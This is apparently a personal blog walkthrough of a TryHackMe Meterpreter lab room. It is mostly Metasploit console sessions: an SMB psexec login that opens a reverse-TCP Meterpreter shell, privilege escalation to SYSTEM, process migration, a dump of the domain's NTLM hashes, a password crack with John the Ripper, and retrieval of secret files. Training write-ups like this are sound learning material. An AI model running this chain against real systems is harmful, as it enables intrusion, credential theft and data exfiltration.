---
title: Metasploit - Meterpreter  
author: CYB3RM3
name: CYB3RM3 | Metasploit - Meterpreter  
date: 2021-09-26 15:15:40 +0100
categories: [TryHackMe, Web]
tags: [Web, metasploit, msf]
---

THM Room [https://tryhackme.com/room/meterpreter](https://tryhackme.com/room/meterpreter)


## TASK 1 : Introduction to Meterpreter
### No answer needed
No Answer

## TASK 2 : Meterpreter Flavors
### No answer needed
No Answer

## TASK 3 : Meterpreter Commands 
### No answer needed
No Answer

## TASK 4 : Post-Exploitation with Meterpreter 
### No answer needed
No Answer

## TASK 5 : Post-Exploitation Challenge

> The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation.
> You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)

| Username   | Password  |       
|:-----------|:----------|
| ballen     | Password1 |

### What is the computer name ?

Using given information, i searched a module for SMB exploitation :

```console 
msf5 auxiliary(scanner/smb/smb_login) > search smb

Matching Modules
================

   #    Name                                                            Disclosure Date  Rank       Check  Description
   -    ----                                                            ---------------  ----       -----  -----------
   0    auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
[...]
  108  exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution

msf5 auxiliary(scanner/smb/smb_login) > use 108
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > setg RHOSTS 10.10.99.129
msf5 exploit(windows/smb/psexec) > setg SMBPass Password1
msf5 exploit(windows/smb/psexec) > setg SMBUser ballen
msf5 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                10.10.99.128     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass               Password1        no        The password for the specified username
   SMBUser               ballen           no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.196.135    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.196.135:4444 
[*] 10.10.99.128:445 - Connecting to the server...
[*] 10.10.99.128:445 - Authenticating to 10.10.99.128:445 as user 'ballen'...
[*] 10.10.99.128:445 - Selecting PowerShell target
[*] 10.10.99.128:445 - Executing the payload...
[+] 10.10.99.128:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.10.99.128
[*] Meterpreter session 1 opened (10.10.196.135:4444 -> 10.10.99.128:54360) at 2021-09-26 12:30:45 +0100

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
```
{: .nolineno}

Answer : ACME-TEST

### What is the target domain ?

The sysinfo command above give us the domain too !

Answer : FLASH

### What is the name of the share likely created by the user ?

Background the actual meterpreter the search for a new mode for SMB share enumeration :

```console
msf5 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.10.196.135:4444 -> 10.10.99.128:54360 (10.10.99.128)


msf5 exploit(windows/smb/psexec) > search scanner/share
[-] No results from search
msf5 exploit(windows/smb/psexec) > search scanner_share
[-] No results from search
msf5 exploit(windows/smb/psexec) > search enum/share
[-] No results from search
msf5 exploit(windows/smb/psexec) > search enum_share

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  post/windows/gather/enum_shares                   normal  No     Windows Gather SMB Share Enumeration via Registry


msf5 exploit(windows/smb/psexec) > use 0
msf5 post(windows/gather/enum_shares) > run

[*] Running against session 1
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 
[*] 	Name: NETLOGON
[*] 
[*] 	Name: speedster
[*] 
[*] Post module execution completed
```
{: .nolineno}

Answer : speedster

### What is the NTLM hash of the jchambers user ?

Meterpreter accept the hashdump command directly, so let's try !

```console
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
```
{: .nolineno}

Ok, let's check what's or process and migrate to another proccess.

```console
meterpreter > ps

Process List
============

 PID   PPID  Name                                       Arch  Session  User                          Path
 ---   ----  ----                                       ----  -------  ----                          ----
 0     0     [System Process]                                                                        
 4     0     System                                     x64   0                                      
 68    4     Registry                                   x64   0                                      
 400   4     smss.exe                                   x64   0                                      
 500   756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 552   544   csrss.exe                                  x64   0                                      
 632   624   csrss.exe                                  x64   1                                      
 676   544   wininit.exe                                x64   0                                      
 692   624   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 756   676   services.exe                               x64   0                                      
 772   676   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 780   692   dwm.exe                                    x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 836   756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 880   756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 948   756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 992   756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1136  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1144  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1152  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1212  756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1332  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1400  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1420  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1712  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2100  692   LogonUI.exe                                x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 2212  692   fontdrvhost.exe                            x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 2220  676   fontdrvhost.exe                            x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 2256  756   spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2312  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2332  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2392  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2416  756   amazon-ssm-agent.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 2444  756   LiteAgent.exe                              x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 2476  756   ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
 2492  756   dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
 2504  756   Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
 2516  756   dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
 2532  756   dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
 2688  2412  powershell.exe                             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 2948  756   vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2972  2416  ssm-agent-worker.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ssm-agent-worker.exe
 2980  2972  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3708  756   msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 4060  2688  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe

meterpreter > getpid
Current pid: 2688
meterpreter > migrate 2256
[*] Migrating from 2688 to 2256...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:cad1611a69ea0142dfd6ee121338244a:::
meterpreter >
```
{: .nolineno}

We are looking for the 4th part of the hash : 69596c7aa1e8daee17f8e78870e25a5c.

Answer : 69596c7aa1e8daee17f8e78870e25a5c

### What is the cleartext password of the jchambers user?

We can use several tools to have the cleartext password of the NTLM hash. You can use online tools like crackstation or command line tools like John The Ripper or Hashcat.

Crasktation :

![Crasktation](/images/thm/meterpreter/meterpreter_1.png)
_Crasktation_

With John The Ripper :

```console
root@ip-10-10-196-135:~/Desktop/msmeterpreter# cat hash2.txt 
69596c7aa1e8daee17f8e78870e25a5c
root@ip-10-10-196-135:~/Desktop/msmeterpreter# john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt hash2.txtUsing default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (?)
1g 0:00:00:01 DONE (2021-09-26 13:58) 0.9090g/s 46778p/s 46778c/s 46778C/s blackrose1..2pac4ever
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }

Answer : Trustno1

### Where is the "secrets.txt"  file located?

```console
meterpreter > search -f "secret*"
Found 2 results...
    c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt (35 bytes)
    c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\secrets.txt.lnk (1045 bytes)
meterpreter >
```
{: .nolineno }

Answer : c:\Program Files (x86)\Windows Multimedia Platform

### What is the Twitter password revealed in the "secrets.txt" file?

Going to the location then print the file content :

```console
meterpreter > shell
Process 3408 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\Program Files (x86)\Windows Multimedia Platform
cd c:\Program Files (x86)\Windows Multimedia Platform

c:\Program Files (x86)\Windows Multimedia Platform>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Program Files (x86)\Windows Multimedia Platform

07/30/2021  08:33 PM    <DIR>          .
07/30/2021  08:33 PM    <DIR>          ..
07/30/2021  07:44 AM                35 secrets.txt
09/15/2018  07:12 AM            40,432 sqmapi.dll
               2 File(s)         40,467 bytes
               2 Dir(s)  15,242,125,312 bytes free


c:\Program Files (x86)\Windows Multimedia Platform>type secrets.txt
type secrets.txt
My Twitter password is KDSvbsw3849!
```
{: .nolineno }

Answer : KDSvbsw3849!

### Where is the "realsecret.txt" file located? 

```console
meterpreter > search -f "*secret.txt*"
Found 1 result...
    c:\inetpub\wwwroot\realsecret.txt (34 bytes)
```
{: .nolineno }

Answer : c:\inetpub\wwwroot

### What is the real secret?

Going to the location and showing the file content :

```console
c:\Program Files (x86)\Windows Multimedia Platform>cd c:\inetpub\wwwroot
cd c:\inetpub\wwwroot

c:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\inetpub\wwwroot

07/30/2021  08:32 PM    <DIR>          .
07/30/2021  08:32 PM    <DIR>          ..
07/30/2021  07:56 AM               729 iisstart.htm
07/30/2021  06:52 AM            99,710 iisstart.png
07/30/2021  08:30 AM                34 realsecret.txt
               3 File(s)        100,473 bytes
               2 Dir(s)  15,242,125,312 bytes free

c:\inetpub\wwwroot>type realsecret.txt
type realsecret.txt
The Flash is the fastest man alive
c:\inetpub\wwwroot>
```
{: .nolineno }

Answer : The Flash is the fastest man alive